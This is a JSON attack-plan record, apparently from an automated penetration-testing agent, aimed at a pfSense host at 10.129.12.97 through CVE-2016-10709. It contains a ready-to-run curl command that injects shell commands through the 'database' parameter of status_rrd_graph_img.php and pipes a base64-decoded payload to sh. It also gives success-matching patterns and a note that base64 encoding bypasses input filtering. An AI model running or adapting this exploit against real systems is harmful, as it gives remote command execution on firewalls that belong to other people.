{
  "plan_id": "plan_1701234567_01",
  "target_ip": "10.129.12.97",
  "context_hash": "pfsense_cve_2016_10709_lighttpd_rce",
  "attack_vectors": [
    {
      "vector_id": "vec_01",
      "priority": 1,
      "action": {
        "tool_name": "exploit_runner",
        "command_template": "curl -k 'https://{target}/status_rrd_graph_img.php?database=queues;echo+{payload}|base64+-d|sh'",
        "parameters": {
          "target": "10.129.12.97",
          "payload": "$(echo 'id' | base64)",
          "method": "GET"
        },
        "timeout_seconds": 30
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "RCE",
          "mitre_id": "T1190",
          "cve_id": "CVE-2016-10709"
        },
        "hypothesis": {
          "confidence_score": 0.82,
          "rationale_tags": [
            "pfsense_confirmed",
            "lighttpd_1.4.35",
            "weak_security",
            "playbook_match"
          ],
          "expected_success": true
        },
        "success_criteria": {
          "match_type": "regex_match",
          "match_pattern": "(uid=|gid=|groups=)",
          "negative_pattern": "(404 Not Found|403 Forbidden|syntax error)"
        }
      },
      "rag_context": {
        "payload_snippet": "database=queues;echo+{base64_payload}|base64+-d|sh",
        "insight": "Public exploits fail due to strict filtering; manual base64 encoding bypasses input validation",
        "exploitation_logic": "Command injection via semicolon separator in database parameter, base64 encoding evades character filtering",
        "vulnerability_context": "pfSense <= 2.3.2 vulnerable in status_rrd_graph_img.php via unvalidated database parameter",
        "source": "pfsense_cve_2016_10709_playbook"
      }
    }
  ],
  "created_at": "2024-01-01T12:00:00Z"
}